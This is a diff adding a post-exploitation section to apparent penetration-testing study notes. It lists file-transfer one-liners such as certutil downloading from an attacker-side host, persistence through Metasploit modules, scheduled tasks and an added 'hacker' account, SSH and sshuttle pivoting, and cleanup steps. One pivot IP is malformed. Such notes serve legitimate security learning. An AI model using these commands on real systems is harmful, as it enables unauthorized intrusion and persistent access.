@@ -245,3 +245,54 @@ C:\> hostname
     - PrintNightmare
     - Sam the Admin
 - It's worth checking for these vulnerbilities, but you should not attempt to exploit them unless your client approves
+
+# Post Exploitation
+## File Transfers Review
+
+- Certutil
+    - certutil.exe -urlcache -f http://10.10.10.10/file.txt
+- HTTP 
+    - python -m http.server 80
+-  Browser
+    - Navigate directly to file
+- FTP
+    - python -m pyftpdlib 21 (attacker machine)
+    - ftp 10.10.10.10
+- Linux
+    - wget 
+
+## Maintaining Access
+
+If we something happen and we lost the machine, we must have access to gain the machine back
+
+- Persistence Scripts
+    - `run persistence -h`
+    - `exploit/windows/local/persistence`
+    - `exploit/windows/local/registry_persistence`
+- Scheduled Tasks
+    - `run scheduleme`
+    - `run schtaskabuse`
+- Add a user
+    - `net user hacker password123 /add`
+
+## Pivoting
+
+Imagine u compromise a machine and in this machine you have ip `10.10.155.5`
+the machine you are in have another NIC with IP `10.10.10.5` and u want to scan this new network
+what you can do is :
+- setup proxy 
+```bash
+(kali@kali)$ cat /etc/proxychains4.conf
+(kali@kali)$ ssh -f -N -D 9050 -i pivot root@10.10.10.155.5 # -f bg the ssh, -N for forwarding ports, -D bind the port
+(kali@kali)$ proxychains nmap -p.. 10.10.10.255 -sT
+# another way is sshuttle
+(kali@kali)$ sshuttle -r root@10.10.155.5 10.10.10.0/24 --ssh-cmd "ssh -i pivot"
+# or chisel
+```
+
+## CLEANUP
+
+- Make the system/network as it was when you entered it
+    - Remove executables, scripts, and added files
+    - Remove malware, rootkits, and added user accounts
+    - Set settings back to original configurations
